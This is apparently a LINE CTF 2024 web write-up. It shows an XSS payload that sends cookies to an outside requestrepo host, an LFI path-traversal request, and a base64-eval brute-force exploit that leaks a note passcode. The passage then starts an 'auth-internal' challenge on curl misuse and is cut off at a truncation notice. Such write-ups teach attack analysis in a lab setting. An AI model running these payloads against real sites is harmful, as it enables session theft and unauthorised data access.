We are given a web server written in node.js and a bot that we can send to line.ctf domains. The goal is to get the flag from an internal note. Thing is, we don't have access to `msg.line.ctf` so we cannot create notes ourselves.

First thing that we need to do is to get the note ID of the flag. That is pretty easy, since there's an XSS in the bot frontend:

```
    function fillAlert(name, msg) {  
        if (msg) {  
            document.getElementById(name).innerHTML = msg;  
            document.getElementById(name).style = "display:block";  
        }  
    }  
    window.onload = () => {  
        const urlParams = new URLSearchParams(window.location.search);  
        fillAlert('error', urlParams.get('error'));  
        fillAlert('success', urlParams.get('success'));  
    };
```

We notice that the note ID is set as follows:

```
    res.cookie('noteId', noteId, {  
        domain: DOMAIN,  
        httpOnly: false  
        });
```

Where DOMAIN is line.ctf, so because we are on the same site on the bot endpoint, we can just leak the note ID from the cookie.

```
    http://bot.line.ctf/?error=<img src=x onerror="location=`//06sjnkhn.requestrepo.com/?${document.cookie}`;" />
```

Next comes the tricky part, the bot is using this function:

```
    function genPasscode() {  
      let chars = "LINECTF";  
      let emojis = [">.<", ">,<"];  
      let passCode = Array.from(crypto.randomFillSync(new Uint32Array(4))).map((x) => chars[x % chars.length]).join('');  
      passCode += emojis[crypto.randomInt(emojis.length)];  
      return passCode;  
    }
```

To generate passcodes for the flag note. If we take a closer look, there's only 4802 passcodes in total, which is totally bruteforceable. There's also a LFI in the public endpoint:

```
    app.use('/public', function (req, res, next) {   
      res.sendFile(__dirname + '/public' + decodeURIComponent(req.path), { root: '/' });  
    });
```

Which we can use to include files. And this is the `/read` endpoint:

```
    app.get('/read', (req, res) => {  
      if (!req.headers['x-ctf-from']) return res.redirect('/');  
      let { passCode, noteId, next } = req.query;  
      if (typeof passCode === 'string' && typeof noteId === 'string' && REGEX.test(noteId)) {  
        if (!next) next = '/content';  
        try {  
          let noteDir = 'notes/' + noteId;  
          let notePath = noteDir + '/' + md5(passCode).substring(10);  
          if (fs.existsSync(notePath)) {  
            let content = fs.readFileSync(notePath);  
            fs.rmSync(noteDir + '/', { recursive: true, force: true });  
            return res.redirect(next + `?content=` + encodeURIComponent(content));  
          } else {  
            if (fs.existsSync(noteDir)) fs.rmSync(noteDir + '/', { recursive: true, force: true });  
            return res.send('<script>alert("Read note failed")</script>');  
          }  
        } catch {  
          return res.send('<script>alert("Read note failed")</script>');  
        }  
      }  
      return res.redirect('/');  
    });
```

So we give it the passcode, noteId and an optional ?next parameter. If we know the passcode for the noteId, we can just use ?next to exfiltrate the flag to our server, no XSS required. As we can see, the note is saved at `notes/${noteId}/${md5(passCode).substring(10)}`. So we can bruteforce the passCode locally on the bot using the LFI and <https://xsleaks.dev/docs/attacks/error-events/>.

But, even after we get the passcode, we still need to bypass the first line `if (!req.headers['x-ctf-from']) return res.redirect('/');`.

If we check the bot code, we can find this:

```
    page = await browser.newPage();  
    let requestCount = 0;  
    await page.setRequestInterception(true);  
    page.on('request', (request) => {  
      requestCount++;  
      let pageURL = page.url();  
      if (!request.isNavigationRequest() || (pageURL !== 'about:blank' && pageURL !== request.url()) || requestCount !== 1) {  
          request.continue();  
          return;  
      }  
      const headers = request.headers();  
      headers['X-CTF-From'] = 'HeadlessChrome';  
      request.continue({  
          headers  
      });  
    });  
    await page.goto(url);
```

So basically, only the first URL that the bot visits will have the `X-CTF-From` header set to `HeadlessChrome`.

The plan is as follows:

  1. Get the note ID of the flag
  2. Bruteforce the passcode locally on the bot
  3. Send the bot to the `/read` endpoint with the passcode and note ID
  4. Get the flag


Qyn developed this cool exploit for bruteforcing the passCode on the bot:

```
    function doStuff() {  
      
        function getMD5First10(inputString) {  
            var hash = CryptoJS.MD5(inputString);  
            return hash.toString(CryptoJS.enc.Hex).substring(10);  
        }  
      
        function product(iterables, repeat) {  
        var argv = Array.prototype.slice.call(arguments), argc = argv.length;  
        if (argc === 2 && !isNaN(argv[argc - 1])) {  
            var copies = [];  
            for (var i = 0; i < argv[argc - 1]; i++) {  
                copies.push(argv[0].slice()); // Clone  
            }  
            argv = copies;  
        }  
        return argv.reduce(function tl(accumulator, value) {  
            var tmp = [];  
            accumulator.forEach(function(a0) {  
            value.forEach(function(a1) {  
                tmp.push(a0.concat(a1));  
            });  
            });  
            return tmp;  
        }, [[]]);  
        }  
      
        function probeError(url) {  
            return new Promise((resolve, reject) => {  
                let script = document.createElement('script');  
                script.src = url;  
                script.onload = () => resolve(1);  
                script.onerror = () => resolve(0);  
                document.head.appendChild(script);  
            });  
        }  
      
        let noteId = document.cookie.split("=")[1];  
      
        const REPORT_URL = "https://xexmwndl.requestrepo.com/";  
        async function tryCode(code) {  
            let md5Code = getMD5First10(code);  
            let response = await probeError(`http://msg.line.ctf/public/..%2fnotes/${noteId}/${md5Code}`);  
            if (response == 1) {  
                location.href = `${REPORT_URL}?passCode=${code}&noteId=${noteId}`  
            }  
        }  
      
        let codes = [];  
      
        for (let prefix of product("LINECTF".split(''), 4)) {  
            for (let sufix of product([">.<", ">,<"])) {  
                codes.push(prefix.join("") + sufix.join(""))  
            }  
        }  
      
        let script = document.createElement('script');  
        script.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js";  
        script.onload = (async function() {  
            let promises = [];  
            for (let code of codes) {  
                promises.push(tryCode(code));  
            }  
        });  
        document.head.appendChild(script);  
    }  
      
    let res = btoa(doStuff.toString());  
    copy(`http://bot.line.ctf/?error=<img src=x onerror="eval('('+atob(\`${res}\`)+')();')" />`)
```

**LINECTF{998c14a3e9e01fceb81b2411030d5205}**

## auth-internal (341 pts, 6 solves) - Web

Description:

```
    I've created an auth system for sso, is it cooool?
    
    http://35.200.122.11:10000/
    
    http://35.200.122.11:20000/
    
    http://35.200.122.11:30000/
```

We are given a complex service that has a public endpoint and an internal endpoint. The goal is to get the flag from the internal endpoint. The authentication is done via SSO on the auth service.

We can create an account on the auth service and use requestrepo to respond to challenges (since it uses curl to check the response). However it does that in a rather insecure way:

```
    func GenVerifyURL(url string) string {  
    	u := strings.TrimRight(url, "/")  
    	f := "/verify.txt"  
    	return u + f  
    }  
      
    func VerifyRequest(u string) (string, error) {  
    	rs, err := exec.Command("curl", "-H", "User-Agent: Verifier", u).Output() // I tested it and it's safe!  
    	if err != nil {  
    		return "", errors.New("error during verify")  
    	}  
    	return string(rs), nil  
    }
```

Where the url is taken from the user. The url is checked at registration like so:

```
    func (s *Server) ValidationRegistRequest(w http.ResponseWriter, r *http.Request) error {  
    	n := r.Form.Get("username")  
    	if len(n) < 4 || len(n) > 32 {  
    		return errors.ErrInvalidUsername  
    	}  
    	u, _ := url.Parse(r.Form.Get("url"))  
    	if u.Scheme != "http" && u.Scheme != "https" {  
    		return errors.ErrInvalidUrl  
    	}  
    	return nil  
    }
```

But actually, the err check is _after_ the user is created in the database:

```
    	err := s.ValidationRegistRequest(w, r)  
    	s.UserStore.CreateUser(  
    		utils.GenUserID(),  
    		r.Form.Get("username"),  
```

---

*Truncated at 1200 lines. Full text: <https://adragos.ro/line-ctf-2024/#zipviewer-version-citizen>*
